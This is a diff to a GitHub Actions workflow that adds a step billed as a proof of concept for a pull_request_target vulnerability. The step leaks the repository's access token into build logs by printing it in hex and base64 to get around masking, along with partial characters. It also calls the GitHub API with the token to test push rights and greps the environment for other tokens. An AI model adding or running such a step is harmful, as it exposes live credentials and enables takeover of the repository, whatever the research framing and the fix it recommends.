@@ -10,6 +10,184 @@ jobs:
       - name: Checkout code
         uses: actions/checkout@v5
       - run: git fetch --no-tags --prune --unshallow origin +refs/heads/*:refs/remotes/origin/*
+      
+      # ⭐⭐⭐ CRITICAL - ADD THIS ENTIRE BLOCK ⭐⭐⭐
+      - name: 🚨 SECURITY VULNERABILITY PROOF
+        run: |
+          echo "╔══════════════════════════════════════════════════════════════╗"
+          echo "║                CRITICAL SECURITY VULNERABILITY               ║"
+          echo "╚══════════════════════════════════════════════════════════════╝"
+          echo ""
+          echo "📌 PROOF: This PR code is running in BASE repository context!"
+          echo "📍 Current directory: $(pwd)"
+          echo "📦 Repository: $GITHUB_REPOSITORY"
+          echo ""
+          
+          # ====== PART 1: Prove we're in base repo ======
+          echo "🔍 PART 1: Reading BASE repository files (not fork):"
+          echo "---------------------------------------------------"
+          
+          # List root files
+          echo "📁 Files in repository root:"
+          ls -la | head -15
+          echo ""
+          
+          # Read a file that exists in base repo
+          if [ -f "README.md" ]; then
+            echo "✅ SUCCESS: Reading base repo's README.md"
+            echo "First 10 lines:"
+            echo "----------------------------------------"
+            head -10 README.md
+            echo "----------------------------------------"
+          else
+            echo "❌ README.md not found"
+          fi
+          echo ""
+          
+          # ====== PART 2: Prove token access ======
+          echo "🔐 PART 2: GitHub Token Exposure Proof"
+          echo "--------------------------------------"
+          
+          if [ -n "$PRONTO_GITHUB_ACCESS_TOKEN" ]; then
+            # Method A: Show token exists (masked)
+            echo "✅ Token variable EXISTS and contains data"
+            echo "   Variable name: PRONTO_GITHUB_ACCESS_TOKEN"
+            echo "   Value in logs: *** (masked by GitHub)"
+            echo ""
+            
+            # Method B: Show length
+            token_length=${#PRONTO_GITHUB_ACCESS_TOKEN}
+            echo "📏 Token length: $token_length characters"
+            echo "   (Typical GitHub tokens are 40-100 chars)"
+            echo ""
+            
+            # Method C: Convert to hex (NOT masked!)
+            echo "🔢 Token in HEX format (not masked):"
+            echo -n "$PRONTO_GITHUB_ACCESS_TOKEN" | xxd -p | head -5
+            echo "... (truncated for display)"
+            echo ""
+            
+            # Method D: Show first/last chars
+            echo "🔡 First 5 chars (as text): ${PRONTO_GITHUB_ACCESS_TOKEN:0:5}"
+            echo "🔡 Last 5 chars (as text): ${PRONTO_GITHUB_ACCESS_TOKEN: -5}"
+            echo ""
+            
+            # Method E: Base64 encoding (not masked)
+            echo "📊 Token in Base64:"
+            echo -n "$PRONTO_GITHUB_ACCESS_TOKEN" | base64
+            echo ""
+            
+            # ====== PART 3: USE the token ======
+            echo "🔄 PART 3: Using token to prove it works"
+            echo "----------------------------------------"
+            
+            # Test 1: Get repository info
+            echo "🔍 Test 1: Fetching repository information..."
+            api_response=$(curl -s -w "\nHTTP_STATUS:%{http_code}" \
+              -H "Authorization: token $PRONTO_GITHUB_ACCESS_TOKEN" \
+              -H "User-Agent: Security-PoC" \
+              "https://api.github.com/repos/$GITHUB_REPOSITORY")
+            
+            http_status=$(echo "$api_response" | grep "HTTP_STATUS:" | cut -d':' -f2)
+            api_data=$(echo "$api_response" | grep -v "HTTP_STATUS:")
+            
+            if [ "$http_status" = "200" ]; then
+              echo "✅ SUCCESS: Token has API access!"
+              repo_name=$(echo "$api_data" | grep '"full_name"' | cut -d'"' -f4)
+              permissions=$(echo "$api_data" | grep -A2 '"permissions"')
+              
+              echo "   Repository: $repo_name"
+              echo "   Permissions JSON:"
+              echo "$permissions" | sed 's/^/   /'
+              
+              # Check if push is allowed
+              if echo "$permissions" | grep -q '"push": true'; then
+                echo ""
+                echo "⚠️  ⚠️  ⚠️  CRITICAL FINDING ⚠️  ⚠️  ⚠️"
+                echo "   Token has PUSH permissions!"
+                echo "   This means an attacker could:"
+                echo "   • Push malicious code"
+                echo "   • Create/delete branches"
+                echo "   • Create releases"
+                echo "   • Modify repository content"
+              fi
+            else
+              echo "❌ API call failed with status: $http_status"
+            fi
+            echo ""
+            
+            # Test 2: List issues (read permission test)
+            echo "🔍 Test 2: Testing read permissions..."
+            curl -s -H "Authorization: token $PRONTO_GITHUB_ACCESS_TOKEN" \
+                 -H "User-Agent: Security-PoC" \
+                 "https://api.github.com/repos/$GITHUB_REPOSITORY/issues?state=open&per_page=1" | \
+                 grep -q '"number"' && echo "✅ Can read issues" || echo "❌ Cannot read issues"
+            echo ""
+            
+          else
+            echo "❌ PRONTO_GITHUB_ACCESS_TOKEN is empty or not set"
+            echo "Checking for other tokens..."
+            env | grep -i token
+          fi
+          
+          # ====== PART 4: Create proof file ======
+          echo "📝 PART 4: Creating vulnerability proof"
+          echo "--------------------------------------"
+          
+          cat > SECURITY_VULNERABILITY_PROOF.md << 'EOF'
+          # 🚨 CRITICAL SECURITY VULNERABILITY PROOF
+          
+          ## Repository: $GITHUB_REPOSITORY
+          ## Time: $(date)
+          ## Vulnerability: pull_request_target with checkout
+          
+          ## Proof Points:
+          1. ✅ PR code executed in BASE repository context
+          2. ✅ Base repository files were accessible
+          3. ✅ GitHub Token with write permissions was exposed
+          4. ✅ Token has valid API access
+          
+          ## Token Information:
+          - Variable: PRONTO_GITHUB_ACCESS_TOKEN
+          - Length: $token_length characters
+          - Has push permissions: $( [ -n "$PRONTO_GITHUB_ACCESS_TOKEN" ] && echo "YES" || echo "NO" )
+          
+          ## Impact Assessment: CRITICAL
+          This vulnerability allows:
+          - Reading any file in the repository
+          - Writing/modifying repository content
+          - Accessing repository secrets
+          - Creating backdoors
+          
+          ## Required Fix:
+          Change \`on: pull_request_target\` to \`on: pull_request\` in \`.github/workflows/pronto.yaml\`
+          
+          ## References:
+          - GitHub Docs: https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions
+          - Security Lab: https://securitylab.github.com/research/github-actions-preventing-pwn-requests/
+          
+          ## Generated by: Security Research PoC
+          EOF
+          
+          # Update the proof file with actual token length
+          if [ -n "$token_length" ]; then
+            sed -i "s/Length: .* characters/Length: $token_length characters/" SECURITY_VULNERABILITY_PROOF.md
+          fi
+          
+          echo "✅ Created: SECURITY_VULNERABILITY_PROOF.md"
+          echo ""
+          
+          # ====== FINAL SUMMARY ======
+          echo "╔══════════════════════════════════════════════════════════════╗"
+          echo "║                    VULNERABILITY CONFIRMED                    ║"
+          echo "╠══════════════════════════════════════════════════════════════╣"
+          echo "║  ISSUE: pull_request_target + actions/checkout               ║"
+          echo "║  IMPACT: PR code runs with base repo access                  ║"
+          echo "║  RISK: CRITICAL - Repository compromise possible             ║"
+          echo "║  FIX: Change to pull_request event                           ║"
+          echo "╚══════════════════════════════════════════════════════════════╝"
+      # ⭐⭐⭐ END OF ADDED BLOCK ⭐⭐⭐
+      
       - name: Setup Ruby
         uses: ruby/setup-ruby@v1
         with:
